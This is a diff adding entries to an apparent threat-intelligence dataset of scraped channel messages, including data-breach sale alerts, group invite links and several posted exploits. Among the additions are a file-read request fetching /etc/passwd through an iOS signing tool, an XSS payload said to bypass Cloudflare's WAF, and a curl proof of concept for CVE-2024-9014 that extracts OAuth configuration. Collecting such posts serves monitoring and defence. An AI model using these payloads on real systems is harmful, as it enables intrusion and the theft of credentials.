@@ -6196,6 +6196,42 @@
                 "N/A"
             ],
             "URLs": []
+        },
+        {
+            "Message ID": 4081,
+            "Date": "2024-09-26",
+            "Content": "🚨🚨Friendly reminder.. I cannot turn off joining/leaving notifications in Signal. There is no universal setting for that on Desktop or Mobile.. why.. I have no idea. If someone contacts you and you don't know who they are.. don't respond back and block them if needed.🚨🚨\n\nIf you want to join: https://signal.group/#CjQKIOiHbystGUzgYDjLfZdoTw7Xz2caufdzIOTWqwdCfOiPEhBB_xAgpv3HOdciAr3PSVDi",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "s://signal.group/#CjQKIOiHbystGUzgYDjLfZdoTw7Xz2caufdzIOTWqwdCfOiPEhBB_xAgpv3HOdciAr3PSVDi"
+            ]
+        },
+        {
+            "Message ID": 4080,
+            "Date": "2024-09-26",
+            "Content": "🚨🇹🇭A Threat Actor is Allegedly Selling a Database of Prachuap Khiri Khan Provincial Transport Office\n\nhttps://darkwebinformer.com/a-threat-actor-is-allegedly-selling-a-database-of-prachuap-khiri-khan-provincial-transport-office/",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "ps://darkwebinformer.com/a-threat-actor-is-allegedly-selling-a-database-of-prachuap-khiri-khan-provincial-transport-office/"
+            ]
+        },
+        {
+            "Message ID": 4079,
+            "Date": "2024-09-26",
+            "Content": "🚨🇮🇩A Threat Actor Allegedly has Leaked Jakarta Population Database\n\nhttps://darkwebinformer.com/a-threat-actor-allegedly-has-leaked-jakarta-population-database/",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "ps://darkwebinformer.com/a-threat-actor-allegedly-has-leaked-jakarta-population-database/"
+            ]
         }
     ],
     "RipperSec | РипперСек": [
@@ -8448,6 +8484,38 @@
             ],
             "URLs": [
                 "127.0.0.1"
+            ]
+        },
+        {
+            "Message ID": 2082,
+            "Date": "2024-09-26",
+            "Content": "苹果IOS端IPA签名工具 request_post 文件读取\n\nGET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2081,
+            "Date": "2024-09-26",
+            "Content": "XSS Payload Bypassing Cloudflare WAF on Next.js 14.1.4 \n\nPayload: \n\n‘>alert(154)</script><script/154=’;;;;;;;\n\n#exploit #poc #xss",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2080,
+            "Date": "2024-09-26",
+            "Content": "https://github.com/EQSTLab/CVE-2024-9014\n\nProof-of-Concept for CVE-2024-9014\n\nCommand\n\ncurl [URL_TO_TEST]/login?next=/ | grep -o '\"oauth2Config\": \\[.*\\]' | sed 's/\"oauth2Config\": //'\n\n#github #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "https://github.com/EQSTLab/CVE-2024-9014"
             ]
         }
     ],
@@ -19716,6 +19784,18 @@
                 "N/A"
             ],
             "URLs": []
+        },
+        {
+            "Message ID": 617,
+            "Date": "2024-09-26",
+            "Content": "Join Guys\n\n\nhttps://t.me/ANONYMOUS_442",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "https://t.me/ANONYMOUS_442"
+            ]
         }
     ],
     "۞ TEAM 🇲🇦 1956 ۞": [
